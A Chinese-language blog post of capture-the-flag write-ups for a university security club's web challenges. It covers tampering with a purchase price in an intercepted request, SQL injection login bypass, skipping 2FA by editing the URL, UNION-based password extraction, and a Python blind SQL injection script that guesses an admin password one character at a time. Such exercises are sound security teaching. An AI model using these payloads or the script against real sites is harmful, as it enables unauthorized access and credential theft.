---
title: 2023 Fall Bamboofox社課題解 Week 1
top_img: transparent
date: 2023-10-02 23:31:07
tags:
    - WebSecurity
    - Bamboofox社課題解
categories:
    - Bamboofox社課
cover: Bamboofox社課/bamboofox-2023-fall-week1/110855742.jpg
description: 2023 Fall Bamboofox社課題解 Week 1 (WebSecurity)
---

[本周題目](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges)

## 1. [[Web] Cat shop](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/271)

這題要利用[BurpSuite](https://portswigger.net/burp)來監聽網頁。

進入BurpSuite，開proxy讓他能夠代理收發瀏覽器裡面的http request，隨便買一隻貓，會發現購買介面的連結為
```bash
http://bamboofox.cs.nctu.edu.tw:11306/item/5428
```
最後面的編號是照順序的，可以推知，flag的編號是5430，所以可以直接改連結進到購買flag的畫面

這時候會發現錢不夠用，從之前的post可以看出，貓咪的價格是直接寫在post裡的，最底下會有:
```bash
item_id=5430&cost=2147483648
```
這時候只要打開攔截，把post中的cost修改成1之類的小數字，就可以有足夠的錢購買了，成功獲得flag。

## 2. [[Web] Login Panel (login)](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/267)

這題登入admin的SQL為:
```sql
SELECT * FROM Users WHERE username = '輸入的username' AND password = '輸入的password'
```
它會自動找到admin並登入，不過只要密碼錯誤，AND的後項就不會成立，造成整個式子False。所以要想辦法讓它必然是True。

這裡使用SQL injection的技巧，把密碼設計成以下:
```sql
' OR ''='
```
放進去password的地方之後，SQL變為:
```sql
SELECT * FROM Users WHERE username = 'admin' AND password = '' OR ''=''
```
因為空字串必等於空字串，因此此式必定成立，就可以在任意密碼下登入admin帳號

登入之後，雖然不知道2FA碼是多少，但我們知道guest登入之後，所在的路徑是dashboard結尾。
```bash
https://login-panel.ching367436.me:8443/dashboard
```
所以嘗試把admin登入後網址的2fa結尾，直接改成dashboard結尾就可以得到flag了:

## 3. [[Web] Login Panel 2 (password)](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/269)

這題的關鍵在於，登入進去之後，會有一句Welcome back username。因為這個username是從資料庫裡取出來的，所以我們可以試著讓他取出來的東西不是username，而是flag(此題的flag為admin的密碼，標題有寫)

這題跟上題的方法類似，不過要用到SQL語法裡的UNION來設計，設計出以下的密碼:
```sql
' UNION SELECT 1,(SELECT password FROM Users WHERE username='admin'),3,4 --
```
讓SQL變成
```sql
SELECT * FROM Users WHERE username = '輸入的username' AND password = '' UNION SELECT 1,(SELECT password FROM Users WHERE username='admin'),3,4 --'
```
前面的SELECT必定失敗，但是透過UNION，他會同時在SELECT另一個東西，當SELECT的東西不存在時，他會自己創造一個。這裡透過創造一個第二欄(username欄)的值是資料庫中，admin的密碼。就可以讓他Welcome back的username是admin的密碼，也就是flag。

順帶一提，這個資料庫的table欄位為:id,username,password,code

## 4. [[Web] Login Panel (password)](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/268)

這題跟第一題的網站是一樣的，不過這次不是要登入，而是要試出admin的password(如標題所述)

這題有擋第3題的方法，因此我們不能夠直接抓到admin的password，但我們這裡可以配合python暴搜admin的密碼是甚麼。

首先設計密碼為:
```sql
g' OR substr((SELECT password FROM Users WHERE username='admin'), {num}, 1)='{trychar}' --
```
登入的SQL變成底下這樣
```sql
SELECT * FROM Users WHERE username = '輸入的username' AND password = 'g' OR substr((SELECT password FROM Users WHERE username='admin'), 1, 1)='B' --'
```
這個SQL代表，OR當admin的password的substring從第1位開始數，長度為1的字串(第1個字)，等於'B'時，OR後面的東西會是True，會成功登入。

透過這個方法，我們可以一一檢測，admin的password中的某一位是不是某個字，如果是的話，就會接收到成功登入的回傳html。

寫成python的爆搜方法如下(我寫得不好，這個code要跑頗久，建議建表之類的改良)，至於post應該帶甚麼內容，可以自己用BurpSuite看:
```py
import requests;

URL = 'https://login-panel.ching367436.me:8443/login?msg=invalid_credentials'
stop = 0
flag = ''
for num in range(1,100):
    if stop:
        break
    print(f"now if run position {num}")
    for i in range(1,128):
        trychar = i.to_bytes(1,'big').decode() # 關於此行的詳細，請參考https://hackmd.io/@9UfXRWPzS62YaxdR7uwZ0Q/B1K4TRr16
        post = requests.post(URL,
                            {
                                'username':'guest',
                                'password':f'g\' OR substr((SELECT password FROM Users WHERE username=\'admin\'), {num}, 1)=\'{trychar}\' --',
                            }
        )

        if '2FA' in post.text: # 登入頁面會有2FA字樣
            flag += trychar
            if trychar == '}':
                stop = 1
            break
    print(flag)
```

封面圖來源: [恥じらい虹夏ちゃん…///](https://www.pixiv.net/artworks/110855742)

---